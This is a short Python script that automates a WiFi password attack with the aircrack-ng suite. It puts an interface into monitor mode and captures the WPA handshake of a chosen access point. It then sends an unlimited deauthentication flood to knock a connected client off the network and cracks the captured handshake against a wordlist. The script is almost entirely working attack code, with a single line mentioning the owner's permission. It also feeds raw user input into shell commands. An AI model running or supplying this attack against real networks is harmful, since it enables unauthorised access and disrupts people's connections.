import os 
import time 
input("script must be ran as root pres enter to continue")
print("only use this script with the network owners permission ")



os.system("iwconfig")
inter = input("copy interface that will be used for the attack ")
os.system("sudo airmon-ng start "+inter+"")
os.system("iwconfig ")
ins = input("enter interface that will be used ")

print("starting scan")
os.system("airodump-ng "+ins+" ")

chanel = input("enter mac address chanel ")
mac  =  input ("mac addrees ")
print("when you see a mac addres connected to the network copy it we will use it later")
os.system("sudo airodump-ng -c"+chanel+" -w cap --bssid "+mac+" "+ins+"")

nmac = input("enter a mac addres conected to the network ") 
os.system("aireplay-ng --deauth 0 -a "+mac+" -c "+nmac+" "+ins+"")

print("stoping monitor mode ")

os.system("sudo airmon-ng stop "+ins+"")

wordlist = input("enter wordlist path")

print("atempting to crack password with "+wordlist+"")

os.system("sudo aircrack-ng cap-01.cap -w "+wordlist+"")










